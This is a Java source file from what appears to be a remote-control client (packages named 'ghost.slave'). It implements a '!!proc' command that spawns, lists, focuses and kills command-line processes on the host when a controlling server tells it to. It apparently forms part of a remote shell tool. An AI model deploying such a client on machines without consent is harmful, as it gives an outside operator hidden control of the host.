package top.idoknow.ghost.slave.func;

import top.idoknow.ghost.slave.cmd.AbstractFunc;
import top.idoknow.ghost.slave.cmd.AbstractProcessor;
import top.idoknow.ghost.slave.conn.HandleConn;
import top.idoknow.ghost.slave.core.ClientMain;
import top.idoknow.ghost.slave.core.ProcessCmd;
import top.idoknow.ghost.util.TimeUtil;

/**
 * 增删改查每个命令行执行对象的指令
 * @author Rock Chin
 */
public class FuncProcess implements AbstractFunc {
    @Override
    public String getFuncName() {
        return "!!proc";
    }

    @Override
    public String[] getParamsModel() {
        return new String[]{"<oper> [params]"};
    }

    @Override
    public String getDescription() {
        return "操作被该客户端发起的命令行操作";
    }

    @Override
    public int getMinParamsAmount() {
        return 1;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        oper:switch (params[0]){
            case "focus":{
                if(params.length<2){
                    HandleConn.writeToServerIgnoreException("proc focus命令语法不正确.\n");
                    break;
                }
                for(String key:FuncDefault.processList.keySet()){
                    if(key.startsWith(params[1])){
                        FuncDefault.focusedProcess=FuncDefault.processList.get(key);
                        HandleConn.writeToServerIgnoreException("聚焦process:"+key+"\n");
                        FuncDefault.focusedProcess.flush();
                        break oper;
                    }
                }
                HandleConn.writeToServerIgnoreException("找不到"+params[1]+"开头的process\n");
                break oper;
            }
            case "ls":{
                new Thread(()-> {
                    try {
                        HandleConn.writeToServer("列表所有此客户端已连接的process(" + FuncDefault.processList.size()
                                + ")\nkey\tinitCmd\tstartTime\tstate\n");
                        for (String key :FuncDefault.processList.keySet()) {
                            HandleConn.writeToServer(key + "      " + FuncDefault.processList.get(key).cmd + "         "
                                    + TimeUtil.millsToMMDDHHmmSS(FuncDefault.processList.get(key).startTime) + "   " + (FuncDefault.focusedProcess == FuncDefault.processList.get(key)) + "\n");
                        }
                        HandleConn.writeToServer("列表完成.\n");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }).start();
                break oper;
            }
            case "bg":
            case "new":{
                String name;
                if(params.length<2){
                    name=""+ ProcessCmd.UID_COUNT++;
                }else{
                    name=params[1];
                }
                HandleConn.writeToServerIgnoreException("新建"+(params[0].equalsIgnoreCase("bg")?"后台":"")+"进程:"+name+"\n");
                ProcessCmd processCmd;
                processCmd = new ProcessCmd(name);
                if(params.length>=3){//如果有初始执行指令
                    //包装要执行的命令
                    StringBuffer cmdStr=new StringBuffer();
                    String[] arr=subArray(params,2,params.length);
                    for(int i=0;i<arr.length;i++){
                        cmdStr.append(arr[i]+" ");
                    }
                    processCmd.cmd =cmdStr.toString();
                }else {
                    processCmd.cmd ="cmd";
                }
                FuncDefault.processList.put(name,processCmd);
                processCmd.start();
                if(params[0].equalsIgnoreCase("new")) {
                    FuncDefault.focusedProcess = FuncDefault.processList.get(name);
                    HandleConn.writeToServerIgnoreException("聚焦process:" + name + "\n");
                }
                break oper;
            }
            case "disc":{
                if(params.length<2){
                    HandleConn.writeToServerIgnoreException("proc disc命令语法不正确.\n");
                    break oper;
                }
                //注意！！这里仅仅是断开与进程的连接而不是结束进程
                if(FuncDefault.processList.containsKey(params[1])){
                    try {
                        FuncDefault.processList.get(params[1]).process.destroy();
                        FuncDefault.removeProcess(params[1]);
                    }catch (Exception e){
                        HandleConn.writeToServerIgnoreException("断连process时出现错误\n"+ ClientMain.getErrorInfo(e));
                    }
                }else {
                    HandleConn.writeToServerIgnoreException("仅能使用全名来断连process\n");
                }
                break oper;
            }
            default:{
                HandleConn.writeToServerIgnoreException("!!proc 命令语法不正确\n");
                break oper;
            }
        }
        HandleConn.sendFinishToServer();
    }
    /**
     * 取部分数组
     * @param array 原数组
     * @param start 起始位置(包含)
     * @param end 终点位置(不含)
     * @return 截取出的数组
     */
    private String[] subArray(String[] array,int start,int end){
        String[] result=new String[end-start];
        for(int i=start;i<end;i++){
            result[i-start]=array[i];
        }
        return result;
    }
}
